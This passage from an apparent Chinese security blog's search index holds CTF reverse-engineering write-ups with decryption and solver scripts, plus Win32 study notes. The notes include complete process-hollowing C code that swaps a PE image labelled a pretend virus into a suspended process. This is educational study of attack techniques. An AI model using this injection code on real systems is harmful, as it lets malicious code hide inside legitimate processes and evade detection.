0X56, 0X14, 0XFFFFFF89, 0X4C, 0X4C, 0X2E, 0XFFFFFF9C, 0X17, 0XFFFFFFC4, 0XFFFFFFC2, 0XFFFFFFA7, 0XFFFFFF82, 0X1F&#125;; for (int i = 0; i &lt; 32; i++) &#123; printf(&quot;%X &quot;, a[i] &amp; 0xff); &#125; return 0;&#125;//F2 88 35 49 F8 5C 2A 4 A8 4E 86 9E BE F9 2A E C6 4 94 56 14 89 4C 4C 2E 9C 17 C4 C2 A7 82 1F 找到源程序，调试起来，修改flag，进行验证 修改为 运行 发现程序输出success 所以最终的flag应该是 1flag = b&#x27;flag&#123;\\xF2\\x88\\x35\\x49\\xF8\\x5C\\x2A\\x4\\xA8\\x4E\\x86\\x9E\\xBE\\xF9\\x2A\\xE\\xC6\\x4\\x94\\x56\\x14\\x89\\x4C\\x4C\\x2E\\x9C\\x17\\xC4\\xC2\\xA7\\x82\\x1F&#125;&#x27;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://zzzzsky.github.io/categories/CTF/"}],"tags":[{"name":"CTFWP","slug":"CTFWP","permalink":"https://zzzzsky.github.io/tags/CTFWP/"}]},{"title":"陇原战\"疫\"2021网络安全大赛_RE_WP","slug":"陇原战疫2021_RE_WP","date":"2021-11-11T02:00:00.000Z","updated":"2021-11-29T11:44:57.427Z","comments":true,"path":"2021/11/11/陇原战疫2021_RE_WP/","link":"","permalink":"https://zzzzsky.github.io/2021/11/11/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021_RE_WP/","excerpt":"","text":"陇原战”疫”2021网络安全大赛_RE_WPEasyRe方法一IDA打开分析 发现sub_4111406这个函数是对输入的flag进行加密，然后将加密后的数据存放到0X41A14C中 来到sub_4111406函数，并不能F5, 直接动态调试一直跟 、 发现程序在不断的生成一些数据，长度是32 多次调试，不同输入，这里获取的数据是一样的 分析，还原算法 12345678910111213141516171819202122232425262728293031323334#include &lt;stdio.h&gt;#include &lt;windows.h&gt;DWORD * enc(char* flag, char* key)&#123; DWORD* pdw_flag = (DWORD*)flag; DWORD* pdw_key = (DWORD*)key; for (int i = 0; i &lt; 8; i++) &#123; pdw_flag[i] ^= pdw_key[(7 * i + 2) % 8]; &#125; for (int i = 0; i &lt; 8; i++) &#123; pdw_flag[i] ^= pdw_flag[i] &lt;&lt; 7; pdw_flag[i] ^= pdw_key[(7 * i + 3) % 8]; pdw_flag[i] ^= pdw_flag[(5 * i + 3) % 8]; pdw_flag[i] ^= pdw_flag[i] &lt;&lt; 13; pdw_flag[i] ^= pdw_key[(7 * i + 5) % 8]; pdw_flag[i] ^= pdw_flag[i] &lt;&lt; 17; &#125; return pdw_flag;&#125;int main()&#123; char flag[33] = &quot;12345678901234567890123456789012&quot;; char key[32] = &#123; 12, 21, 30, 39, 32, 41, 50, 59, 68, 77, 86, 95, 88, 97, 106, 115, 124, 133, 142, 151, 144, 153, 162, 171, 180, 189, 198, 207, 200, 209, 218, 227&#125;; enc(flag, key); return 0; //在这里下断点观察加密后的数据是否与IDA调试时生成的一样&#125; 在末尾下断点调试 IDA调试运行下断点观察加密后的数据 发现是一样的，还原加密算法成功，现在开始写解密脚本 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#include &lt;stdio.h&gt;#include &lt;windows.h&gt;VOID dec_shift_xor(DWORD* mingwen, int shiftlen) &#123; //pdw_flag[i] ^= pdw_flag[i] &lt;&lt; 13 类似这种加密方式，知道加密后的，解密得到原来的数据 //mingwen指向明文 //shiftlen指向移位的的位数 DWORD data = *mingwen; DWORD mask = 1; for (int i = 0; i &lt; shiftlen - 1; i++) &#123; // 构造mask mask = (mask &lt;&lt; 1) + 1; &#125; DWORD zuidi2wei = data &amp; mask; int count = 32 / shiftlen; count = 32 % shiftlen == 0 ? count : count + 1; for (int i = 0; i &lt; count; i++) &#123; zuidi2wei &lt;&lt;= shiftlen; mask &lt;&lt;= shiftlen; data ^= zuidi2wei; zuidi2wei = data &amp; mask; &#125; *mingwen = data;&#125;DWORD* dec(char* enc_flag, char* key)&#123; DWORD* pdw_flag = (DWORD*)enc_flag; DWORD* pdw_key = (DWORD*)key; for (int i = 7; i &gt;=0; i--) &#123; dec_shift_xor(&amp;pdw_flag[i], 17); pdw_flag[i] ^= pdw_key[(7 * i + 5) % 8]; dec_shift_xor(&amp;pdw_flag[i], 13); pdw_flag[i] ^= pdw_flag[(5 * i + 3) % 8]; pdw_flag[i] ^= pdw_key[(7 * i + 3) % 8]; dec_shift_xor(&amp;pdw_flag[i], 7); &#125; for (int i = 0; i &lt; 8; i++) &#123; pdw_flag[i] ^= pdw_key[(7 * i + 2) % 8]; &#125; return pdw_flag;&#125;int main()&#123; char key[32] = &#123; 12, 21, 30, 39, 32, 41, 50, 59, 68, 77, 86, 95, 88, 97, 106, 115, 124, 133, 142, 151, 144, 153, 162, 171, 180, 189, 198, 207, 200, 209, 218, 227&#125;; char enc_flag[33] = &#123; 0x15, 0x86, 0x0F, 0xF9, 0x3D, 0x7C, 0x82, 0xC8, 0x63, 0x32, 0xD7, 0x1B, 0x54, 0x74, 0x0C, 0xA9, 0x05, 0x4E, 0x3F, 0x7D, 0x19, 0xBC, 0xE4, 0x53, 0x7F, 0x39, 0x5B, 0xA8, 0x5E, 0xA4, 0xB2, 0xD4,0&#125;; //提取的0X41A058处的数据 dec(enc_flag, key); printf(&quot;%s&quot;, enc_flag); return 0;&#125; 得到 fc5e038d38a57032085441e7fe7010b0，加上 flag{} 得到 flag&#123;fc5e038d38a57032085441e7fe7010b0&#125; 方法二去花指令 123456789101112131415161718192021222324252627282930313233from ida_bytes import get_bytes, patch_bytesimport readdr = 0x415B53end = 0x0415B79buf = get_bytes(addr, end - addr)buf_str = &quot;&quot;.join([chr(i) for i in list(buf)])pattern = r&quot;\\xE8\\x01\\x00\\x00\\x00.\\x33\\xDB\\x33\\xC0\\x33\\xC9\\x59\\x83\\xC0([\\s\\S])\\xBB([\\s\\S])\\x00\\x00\\x00\\xF7\\xE3\\x83\\xC1\\x20\\x83\\xC0([\\s\\S])\\x33\\xC3\\x51(\\x88\\x45[\\s\\S])\\xC3.&quot;def handler(s): eax = ord(s.group(1)[0]) ebx = ord(s.group(2)[0]) tmp = ord(s.group(3)[0]) c = s.group(4) eax = eax * ebx eax += tmp eax ^= ebx patch_ = &quot;\\xB8&quot; + chr(eax) + &quot;\\x00\\x00\\x00&quot; return patch_ + &#x27;\\x90&#x27;*(0x25-5-5) + c + &quot;\\x90&quot; * 2buf = re.sub(pattern, handler, buf_str, flags=re.I)buf_bytes = bytes([ord(i) for i in buf])patch_bytes(addr, buf_bytes)print(&quot;OK&quot;) Z3模块解决 12345678910111213141516171819202122232425262728293031323334from z3 import *if __name__ == &quot;__main__&quot;: enc = [0xF90F8615, 0xC8827C3D, 0x1BD73263, 0x0A90C7454, 0x7D3F4E05, 0x53E4BC19, 0xA85B397F, 0xD4B2A45E] v5 = [0] * 8 flag = [BitVec(f&quot;flag_&#123;i&#125;&quot;, 32) for i in range(8)] s = Solver() v4 = [0x271E150C, 0x3B322920, 0x5F564D44, 0x736A6158, 0x978E857C, 0xABA29990, 0xCFC6BDB4, 0xE3DAD1C8] for i in range(8): v5[i] = flag[i] ^ v4[(7 * i + 2) % 8] for j in range(8): v5[j] ^= v5[j] &lt;&lt; 7 v5[j] ^= v4[(7 * j + 3) % 8] v5[j] ^= v5[(5 * j + 3) % 8] v5[j] ^= v5[j] &lt;&lt; 13 v5[j] ^= v4[(7 * j + 5) % 8] v5[j] ^= v5[j] &lt;&lt; 17 for i in range(8): s.add(v5[i] == enc[i]) assert s.check() == sat m = s.model() flag = [int.to_bytes(m[i].as_long(), 4, byteorder=&quot;little&quot;).decode() for i in flag] print(&quot;&quot;.join(flag)) EasyRe_Revenge此题与EasyRe_Revenge一样，只是把密文换了，替换上图中的enc_flag即可 1char enc_flag[33] = &#123; 66, 176, 232, 238, 108, 238, 208, 87, 50, 75, 245, 243, 214, 183, 240, 211, 137, 195, 97, 10, 64, 186, 199, 56, 44, 158, 61, 12, 132, 146, 74, 214,0 &#125;; 后来发现，原来EasyRe那道题目，flag直接存在字符串中了，所以把密文换了，才有了这个EasyRe_Revenge findmeIDA打开分析 来到 403844 这个位置 很显然这个位置不可能是strcmp，观察发现404840那个地址处还存了个函数的地址 sub_401866，估计程序有地方把403844这个地方的地址给替换掉了 来到401866位置 分析401767函数，发现是明显的RC4加密 随便输入一个假的flag，12345678901234567890123456， 然后断下，看加密后的数据 写脚本得到密钥流 12345678fake_flag = &quot;12345678901234567890123456&quot;enc_fake_flag = [ 0xD5, 0x25, 0xE2, 0xB6, 0xF1, 0x99, 0x4B, 0xD4, 0xB5, 0x1B, 0x81, 0xD0, 0x47, 0x8F, 0xEF, 0x35, 0x05, 0x46, 0x48, 0xEB, 0x8C, 0x21, 0x6C, 0xB8, 0x05, 0x8D]key = [ord(fake_flag[i]) ^ enc_fake_flag[i] for i in range(26)]print(key)# [228, 23, 209, 130, 196, 175, 124, 236, 140, 43, 176, 226, 116, 187, 218, 3, 50, 126, 113, 219, 189, 19, 95, 140, 48, 187] 然后提取出dword_403040解密即可 12345enc = [0xFFFFFFB7, 0x52, 0x0FFFFFF85, 0x0FFFFFFC1, 0x0FFFFFF90, 0x0FFFFFFE9, 0x7, 0xFFFFFFB8, 0x0FFFFFFE4, 0x1A, 0x0FFFFFFC3, 0x0FFFFFFBD, 0x1D, 0x0FFFFFF8E, 0x0FFFFFF85, 0x46, 0x0, 0x21, 0x44, 0x0FFFFFFAF, 0x0FFFFFFEF, 0x70, 0x32, 0x0FFFFFFB5, 0x11, 0x0FFFFFFC6]key = [228, 23, 209, 130, 196, 175, 124, 236, 140, 43, 176, 226, 116, 187, 218, 3, 50, 126, 113, 219, 189, 19, 95, 140, 48, 187]flag = [chr((enc[i] &amp; 0XFF) ^ key[i]) for i in range(26)]print(&quot;&quot;.join(flag))# SETCTF&#123;Th1s_i5_E2_5tRcm9!&#125; power拿到题目，附件是ARM汇编源文件 直接用arm-none-eabi-as.exe power编译下生成a.out IDA打开 发现是AES加密，这里写的是CBC模式，但其实是ECB模式，写脚本解密即可 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from Crypto.Cipher import AESimport base64import binasciiclass Aescrypt(): def __init__(self, key, model, iv): self.key = self.add_16(key) self.model = model self.iv = iv def add_16(self, par): if type(par) == str: par = par.encode() while len(par) % 16 != 0: par += b&#x27;\\x00&#x27; return par def aesencrypt(self, text): text = self.add_16(text) if self.model == AES.MODE_CBC: self.aes = AES.new(self.key, self.model, self.iv) elif self.model == AES.MODE_ECB: self.aes = AES.new(self.key, self.model) self.encrypt_text = self.aes.encrypt(text) return self.encrypt_text def aesdecrypt(self, text): if self.model == AES.MODE_CBC: self.aes = AES.new(self.key, self.model, self.iv) elif self.model == AES.MODE_ECB: self.aes = AES.new(self.key, self.model) self.decrypt_text = self.aes.decrypt(text) self.decrypt_text = self.decrypt_text.strip(b&quot;\\x00&quot;) return self.decrypt_textif __name__ == &#x27;__main__&#x27;: passwd = b&quot;this_is_a_key!!!&quot; enc_flag_str = &quot;1030a9254d44937bed312da03d2db9adbec5762c2eca7b5853e489d2a140427b&quot; enc_flag = binascii.unhexlify(enc_flag_str) aescryptor = Aescrypt(passwd, AES.MODE_ECB, None) # ECB text = aescryptor.aesdecrypt(enc_flag) print(&quot;明文:&quot;, text) # 明文: b&#x27;flag&#123;y0u_found_the_aes_12113112&#125;&#x27; Eat_something核心代码在Eat_something.wasm中 找到工具将wasm转为.o文件 https://www.52pojie.cn/thread-1438499-1-1.html 用IDA打开，找到w2c_checkright函数，这是验证flag的地方 核心算法就是这一句 v13 != (i32_load(w2c_memory, v16 + 12LL) ^ (2 * v10)) 翻译下就是enc[i] != i ^ (flag[i] * 2) 将enc提取出来，写脚本即可 123456789101112enc = [0x86, 0x8B, 0xAA, 0x85, 0xAC, 0x89, 0xF0, 0xAF, 0xD8, 0x69, 0xD6, 0xDD, 0xB2, 0xBF, 0x6E, 0xE5, 0xAE, 0x99, 0xCC, 0xD5, 0xBC, 0x8B, 0xF2, 0x7D, 0x7A, 0xE3, 0x59, 0x6F, 0x75, 0x20, 0x61, 0x72, 0x65, 0x20, 0x72, 0x69, 0x67, 0x68, 0x74, 0x21, 0x00, 0x59, 0x6F, 0x75, 0x20, 0x61, 0x72, 0x65, 0x20, 0x77, 0x72, 0x6F, 0x6E, 0x67, 0x21, 0x00] flag = []for i in range(26): flag .append(chr((i ^ enc[i]) // 2))print(&quot;&quot;.join(flag))# CETCTF&#123;Th0nk_Y0u_DocTOr51&#125; 最后将CETCTF 改为 SETCTF即为flag","categories":[{"name":"CTF","slug":"CTF","permalink":"https://zzzzsky.github.io/categories/CTF/"}],"tags":[{"name":"CTFWP","slug":"CTFWP","permalink":"https://zzzzsky.github.io/tags/CTFWP/"}]},{"title":"win32学习笔记","slug":"WIN32学习","date":"2019-05-18T02:55:00.000Z","updated":"2022-03-04T12:38:39.937Z","comments":true,"path":"2019/05/18/WIN32学习/","link":"","permalink":"https://zzzzsky.github.io/2019/05/18/WIN32%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"字符编码1. ASCII编码0 - 7F， 0000 0000——–0111 1111标准ASCII码80 - FF 1000 0000 ——-1111 1111 扩展ASCII码 2.GB2312或GB2312-80(针对自己国家)基于扩展ASCII码 单独看每一个字节，都是扩展ASCII码表中的数据，2个表示一个汉字，这就是GB2312编码，但是GB2312存在很大的弊端，例:将一份GB2312编码的邮件发给一个老外的时候，它看到的是乱码，因为不同国家的解释不一样，Big5编码的思路跟GB2312一样，同样的字节，不同的数据，因为解释的不一样怎么解决问题这个乱码问题呢？UNICODE出现 3. UNICODE这是一个编码方案，说白了就是一张包含全世界所有文字的一个编码表，只要这个世界上存在的文字符号，统统给你一个唯一的编码:UNICODE编码范围是: 0 - 0X10FFFF， 可以容纳100多万个符号！ UNICODE 的问题？ 假如说： 中: 0x12 34 国:0x01 23 45 A: 0x41 用多少个字节来存储呢？UNICODE只是一个符号集，它只规定了符号的二进制代码，却没有规定这个二进制代码应该如何存储 4. 如何存储UNICODEUTF-16\\UTF-8是UNICODE的实现方式 UTF-16UTF-16编码以16位无符号整数为单位，注意是16位为一个单位，不表示一个字符就只有16位。这个要看字符的UNICODE编码处于什么范围而定，有可能是2个字节，也有可能是4个字节，现在机器上的UNCODE 编码一般指的就是UTF-16 因为它任何符号都是以2个字节为单位，对于A,B,C这种简单的符号，一个字节就够了，所以用UTF-16可能会浪费空间，在网络传输中效率可能会慢， UTF-8 比如在记事本中写入 “AB字”，然后分别存储为UTF-16 或 UTF-8的格式 “字” UTF-16 是 5B 57​ UTF-8 是 E5 AD 97E5 AD 971110 0101 10****10 1101 10****01 0111红色部分拼接为0101 1011 0101 0111，即5B 57 那么给定一个文本，怎么知道是解析为UTF-16还是UTF-8呢？ BOM (Byte Order Mark)(解决解析时候的问题)UTF-8 || EF BB BFUTF-16(LE) || FF FEUTF-16(BE) || FE FF这是前缀 进程的创建过程进程提供程序所需的资源，如：数据，代码等等。进程是静止不动的 进程内存空间的地址划分 一个进程里面含有一堆PE文件 进程是怎么创建的任何进程都是别的进程创建的：CreateProcess 映射EXE文件 创建内核对象EPROCESS 映射DLL文件(ntdll.dll) 所有EXE都得用到这个DLL文件 创建线程内核对象ETHREAD 系统启动线程 ​ 映射DLL（ntdll.LdrInitializeThunk） ​ 线程开始执行 可以在第4步与第5步之间做一些猥琐的事情，怎么在第4步与第5步之间搞事情呢？？？ 可以在CreateProcess这个函数的第6个参数__in DWORD dwCreationFlags,，将其设置为CREATE_SUSPENDED，然后线程就会被挂起，然后在这个地方进行PE映像切换（傀儡进程），这个在《逆向工程核心原理》第56章有讲，因为这里是讲进程的创建过程，所以对PE影响切换不再描述 这里是这种技术的实验代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140#include &lt;windows.h&gt;#include &lt;stdio.h&gt;typedef DWORD(WINAPI* _TZwUnmapViewOfSection)(HANDLE, PVOID);BOOL PeLoad(HANDLE hProcess, BYTE* peFile, BYTE* peRam, int size);CHAR* LoadFile(CHAR* filePath);DWORD FileBufferToImageBuffer(LPVOID pFileBuffer, LPVOID pImageBuffer);int main()&#123; STARTUPINFO si = &#123; 0 &#125;; PROCESS_INFORMATION pi = &#123;&#125;; CHAR szName[] = &quot;E:\\\\TrayS v1.1.3\\\\TrayS_x86\\\\TrayS.exe&quot;; si.cb = sizeof(si); //创建傀儡进程 BOOL res = CreateProcess( szName, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;si, &amp;pi ); if (res == 0) &#123; printf(&quot;错误CODE: %d\\n&quot;, GetLastError()); &#125; //获取外壳的CONTEXT结构 CONTEXT contex; contex.ContextFlags = CONTEXT_FULL; GetThreadContext(pi.hThread, &amp;contex); printf(&quot;子进程PID: %d\\n&quot;, pi.dwProcessId); printf(&quot;%#X\\n&quot;, contex.Eax); //OEP + IMAGEBASE BYTE* baseAddress = (BYTE*)(contex.Ebx + 8); DWORD dwImageBase = 0; ReadProcessMemory(pi.hProcess, baseAddress, &amp;dwImageBase, 4, NULL); //卸载外壳程序的文件镜像 HMODULE hModuleNt = LoadLibrary(&quot;ntdll.dll&quot;); if (hModuleNt == NULL) &#123; //printf(&quot;获取ntdll句柄失败\\n&quot;); TerminateThread(pi.hThread, 0); return -1; &#125; _TZwUnmapViewOfSection pZwUnmapViewOfSection = (_TZwUnmapViewOfSection)GetProcAddress(hModuleNt, &quot;ZwUnmapViewOfSection&quot;); pZwUnmapViewOfSection(pi.hProcess, (PVOID)dwImageBase); CHAR szFileName[] = &quot;F:\\\\_重学RE笔记\\\\WIN32_PE学习\\\\傀儡进程\\\\傀儡进程\\\\假装自己是病毒.exe&quot;; CHAR * PEFILE = LoadFile(szFileName); IMAGE_DOS_HEADER* pidhsrc = (IMAGE_DOS_HEADER*)PEFILE; IMAGE_NT_HEADERS* pinhsrc = (IMAGE_NT_HEADERS*)(pidhsrc-&gt;e_lfanew + PEFILE); LPVOID pImageBase = VirtualAllocEx(pi.hProcess, (LPVOID)pinhsrc-&gt;OptionalHeader.ImageBase, pinhsrc-&gt;OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if ((DWORD)pImageBase != pinhsrc-&gt;OptionalHeader.ImageBase) &#123; //printf(&quot;VirtualAllocEx 错误码: 0x%X\\n&quot;, GetLastError()); // 0x1e7 试图访问无效地址 //printf(&quot;申请到的指针: 0x%X, 期望的地址: 0x%X\\n&quot;, (DWORD)pImageBase, pinhsrc-&gt;OptionalHeader.ImageBase); TerminateThread(pi.hThread, 0); return -1; &#125; //7、拉伸PE文件，放到此位置 PeLoad(pi.hProcess, (BYTE *)PEFILE, (BYTE*)pImageBase, pinhsrc-&gt;OptionalHeader.SizeOfImage); //8、修改外壳程序的Context contex.Eax = pinhsrc-&gt;OptionalHeader.AddressOfEntryPoint + pinhsrc-&gt;OptionalHeader.ImageBase; DWORD imageBase = pinhsrc-&gt;OptionalHeader.ImageBase; WriteProcessMemory(pi.hProcess, LPVOID(contex.Ebx + 8), &amp;imageBase, 4, NULL); SetThreadContext(pi.hThread, &amp;contex); ResumeThread(pi.hThread); //释放资源区 free(PEFILE); return 0; return 0;&#125;//模拟PE加载//hProcess:进程句柄//peFile:PE拉伸前的地址（在本进程中）//peRam：ImageBase（在hProcess进程中）//size:PE拉伸后对齐的大小BOOL PeLoad(HANDLE hProcess, BYTE* peFile, BYTE* peRam, int size)&#123; BYTE* peImage = (BYTE*)malloc(size); FileBufferToImageBuffer(peFile, peImage); BOOL isSuccess = WriteProcessMemory(hProcess, peRam, peImage, size, NULL); free(peImage); return isSuccess;&#125;//将文件读取到内存CHAR* LoadFile(CHAR* filePath)&#123; FILE* fpShellFile; fopen_s(&amp;fpShellFile, filePath, &quot;rb&quot;); if (fpShellFile == 0) &#123; printf(&quot;加载病毒失败\\n&quot;); ExitProcess(-1); &#125; fseek(fpShellFile, 0, SEEK_END); DWORD dwShellFileSize = ftell(fpShellFile); CHAR* pShellFile = (CHAR*)malloc(dwShellFileSize); fseek(fpShellFile, 0, SEEK_SET); fread(pShellFile, 1, dwShellFileSize, fpShellFile); fclose(fpShellFile); return pShellFile;&#125;// 将PE文件拉伸// pFileBuffer：源文件读到内存去的首地址// pImageBuffer： 拉伸后文件读到内存去的首地址// 返回拉伸后的文件在内存中对齐后的大小DWORD FileBufferToImageBuffer(LPVOID pFileBuffer, LPVOID pImageBuffer)&#123; IMAGE_DOS_HEADER* pDosHeader = (IMAGE_DOS_HEADER*)pFileBuffer; IMAGE_NT_HEADERS* pNtHeader = (IMAGE_NT_HEADERS*)(pDosHeader-&gt;e_lfanew + (DWORD)pDosHeader); IMAGE_FILE_HEADER* pPEHeader = (IMAGE_FILE_HEADER*)((DWORD)pNtHeader + 4); IMAGE_OPTIONAL_HEADER32* pOptionHeader = (IMAGE_OPTIONAL_HEADER32*)((DWORD)pPEHeader + sizeof(IMAGE_FILE_HEADER)); IMAGE_SECTION_HEADER* pSectionHeader = (IMAGE_SECTION_HEADER*)((DWORD)pOptionHeader + pPEHeader-&gt;SizeOfOptionalHeader); memset(pImageBuffer, 0, pNtHeader-&gt;OptionalHeader.SizeOfImage); //复制DOS头 + PE头 + 节表 + 文件对齐 memcpy(pImageBuffer, pFileBuffer, pNtHeader-&gt;OptionalHeader.SizeOfHeaders); for (int i = 0; i &lt; pNtHeader-&gt;FileHeader.NumberOfSections; i++) &#123; memcpy((LPVOID)((DWORD)pImageBuffer + pSectionHeader[i].VirtualAddress), (LPVOID)((DWORD)pFileBuffer + pSectionHeader[i].PointerToRawData), pSectionHeader[i].SizeOfRawData); &#125; return pNtHeader-&gt;OptionalHeader.SizeOfImage;&#125; 句柄表1、什么是内核对象？ 像进程、线程、文件、互斥体、事件等在内核都有一个对应的结构体，这些结构体由内核负责故案例。我们管这样的对象叫做内核对象。 2、 如何管理内核对象 通过句柄表 3、每个进程都有一个句柄表 不是每个内核对象都有句柄表，只有进程内核对象才有句柄表。 4、多进程共享一个内核对象 句柄表是一个私有的值，句柄只有在本进程中才有意义 CloseHandle使内核对象的引用计数 - 1，一般情况下引用计数为0了，没有任何指针指向它，这个内核对象就会被移除，但是进程内核对象和线程内核对象是特例，只有关闭所有的线程句柄和终止掉线程两个条件同时满足的时候，这个线程内核对象才会被移除。 5、 句柄是否可以被继承 在创建一个内核对象的时候，一定会有一个参数 12345typedef struct _SECURITY_ATTRIBUTES &#123; DWORD nLength; LPVOID lpSecurityDescriptor; BOOL bInheritHandle; //该内核对象是否可以被继承&#125; SECURITY_ATTRIBUTES, 6、进程是否能够继承父进程的句柄 当用CreateProcess创建进程的时候，第5个参数bInheritHandles如果设置为TRUE，那么父进程句柄表中可以被继承的内核对象句柄就会被继承过去，具体继承方式如上图所示，就是将整个句-柄表复制过去，不能继承的填充0，这样的话，在子进程中的句柄值可以与父进程一模一样 进程相关API PID是全局句柄表的索引，所以它在 所有进程中都有效 当前进程的 进程句柄 是当前进程句柄表的索引，所以它只在本进程有效 工作路径与模块路径 当前模块路径是不变的，文件放在哪，他就是啥 但是工作路径的话就不同了，工作路径是父进程通过CreateProcess这个API传给他的，通过参数 __in_opt LPCTSTR lpCurrentDirectory将工作目录传给子进程。 如下例: 其他API获取进程PID: GetCurrentProcessId获取进程句柄: GetCurrentProcess获取命令行: GetCommandLine获取启动信息: GetStartupInfo遍历进程ID: EnumProcesses快照: CreateToolhelp32Snapshot 线程1、什么是线程 ​ CreateThread 创建线程 线程是附属在进程上的执行实体，是代码的执行流程 一个进程可以包含多个线程，但一个进程至少要包含一个线程 2、控制线程 暂停线程恢复线程 SuspendThread() ResumeThread() //可以根据这个函数的返回值来判断线程是否挂起 等待线程结束 WaitForSingleObject() WaitForMultipleObject() GetExitCodeThread() 获取线程环境(线程切换的时候要保存环境) GetThreadContext() SetThreadContext()","categories":[{"name":"WIN32学习","slug":"WIN32学习","permalink":"https://zzzzsky.github.io/categories/WIN32%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"win32","slug":"win32","permalink":"https://zzzzsky.github.io/tags/win32/"}]}],"categories":[{"name":"读书笔记","slug":"读书笔记","permalink":"https://zzzzsky.github.io/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"},{"name":"论文阅读","slug":"论文阅读","permalink":"https://zzzzsky.github.io/categories/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/"},{"name":"CTF","slug":"CTF","permalink":"https://zzzzsky.github.io/categories/CTF/"},{"name":"pwn学习","slug":"pwn学习","permalink":"https://zzzzsky.github.io/categories/pwn%E5%AD%A6%E4%B9%A0/"},{"name":"工具","slug":"工具","permalink":"https://zzzzsky.github.io/categories/%E5%B7%A5%E5%85%B7/"},{"name":"安卓","slug":"安卓","permalink":"https://zzzzsky.github.io/categories/%E5%AE%89%E5%8D%93/"},{"name":"python","slug":"python","permalink":"https://zzzzsky.github.io/categories/python/"},{"name":"WIN32学习","slug":"WIN32学习","permalink":"https://zzzzsky.github.io/categories/WIN32%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"MalwareAnalysis","slug":"MalwareAnalysis","permalink":"https://zzzzsky.github.io/tags/MalwareAnalysis/"},{"name":"恶意文档","slug":"恶意文档","permalink":"https://zzzzsky.github.io/tags/%E6%81%B6%E6%84%8F%E6%96%87%E6%A1%A3/"},{"name":"脱壳","slug":"脱壳","permalink":"https://zzzzsky.github.io/tags/%E8%84%B1%E5%A3%B3/"},{"name":"进程注入","slug":"进程注入","permalink":"https://zzzzsky.github.io/tags/%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/"},{"name":"powershell","slug":"powershell","permalink":"https://zzzzsky.github.io/tags/powershell/"},{"name":"set_jmp","slug":"set-jmp","permalink":"https://zzzzsky.github.io/tags/set-jmp/"},{"name":"pwn","slug":"pwn","permalink":"https://zzzzsky.github.io/tags/pwn/"},{"name":"读书笔记","slug":"读书笔记","permalink":"https://zzzzsky.github.io/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"},{"name":"《CTF竞赛权威指南-pwn篇》","slug":"《CTF竞赛权威指南-pwn篇》","permalink":"https://zzzzsky.github.io/tags/%E3%80%8ACTF%E7%AB%9E%E8%B5%9B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-pwn%E7%AF%87%E3%80%8B/"},{"name":"shellcode","slug":"shellcode","permalink":"https://zzzzsky.github.io/tags/shellcode/"},{"name":"二叉树","slug":"二叉树","permalink":"https://zzzzsky.github.io/tags/%E4%BA%8C%E5%8F%89%E6%A0%91/"},{"name":"vm","slug":"vm","permalink":"https://zzzzsky.github.io/tags/vm/"},{"name":"图","slug":"图","permalink":"https://zzzzsky.github.io/tags/%E5%9B%BE/"},{"name":"最短路径","slug":"最短路径","permalink":"https://zzzzsky.github.io/tags/%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84/"},{"name":"IDAPython","slug":"IDAPython","permalink":"https://zzzzsky.github.io/tags/IDAPython/"},{"name":"IDA","slug":"IDA","permalink":"https://zzzzsky.github.io/tags/IDA/"},{"name":"debug","slug":"debug","permalink":"https://zzzzsky.github.io/tags/debug/"},{"name":"struct","slug":"struct","permalink":"https://zzzzsky.github.io/tags/struct/"},{"name":"CTFWP","slug":"CTFWP","permalink":"https://zzzzsky.github.io/tags/CTFWP/"},{"name":"z3","slug":"z3","permalink":"https://zzzzsky.github.io/tags/z3/"},{"name":"ollvm","slug":"ollvm","permalink":"https://zzzzsky.github.io/tags/ollvm/"},{"name":"真机调试","slug":"真机调试","permalink":"https://zzzzsky.github.io/tags/%E7%9C%9F%E6%9C%BA%E8%B0%83%E8%AF%95/"},{"name":"安卓","slug":"安卓","permalink":"https://zzzzsky.github.io/tags/%E5%AE%89%E5%8D%93/"},{"name":"win32","slug":"win32","permalink":"https://zzzzsky.github.io/tags/win32/"}]}